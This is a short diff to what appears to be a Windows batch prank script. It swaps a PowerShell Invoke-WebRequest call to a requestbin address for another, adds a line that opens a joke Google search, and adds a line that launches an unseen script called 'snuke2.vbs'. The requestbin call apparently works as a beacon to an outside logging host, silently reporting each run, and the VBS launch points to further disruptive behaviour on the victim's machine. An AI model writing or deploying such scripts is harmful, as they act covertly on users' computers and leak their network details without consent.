@@ -1,1 +1,3 @@
-powershell -Command Invoke-Webrequest -Uri 'http://requestbin.webengage.org/1lpkmhp1'
+powershell -Command Invoke-Webrequest -Uri 'http://requestbin.webengage.org/1gurtja1'
+start https://www.google.com/search?q=how+to+become+a+skibidi+toilet
+start snuke2.vbs
